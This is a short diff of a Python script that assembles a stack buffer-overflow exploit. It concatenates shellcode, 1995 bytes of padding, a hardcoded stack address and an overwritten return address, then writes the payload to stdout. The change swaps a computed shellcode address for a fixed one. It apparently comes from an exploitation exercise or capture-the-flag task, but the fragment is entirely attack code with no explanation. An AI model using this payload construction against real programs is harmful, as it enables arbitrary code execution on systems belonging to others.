@@ -26,7 +26,7 @@ import sys
 padding = b'A' * 1995
 a_address = 0xfff6cbdc  # Replace maybeeeeee
 
-shells = a_address + 4 + 4
+shells = 0xfff6a0bc
 
 exploit = shellcode + padding + a_address.to_bytes(4, 'little') + shells.to_bytes(4, 'little')
 sys.stdout.buffer.write(exploit)
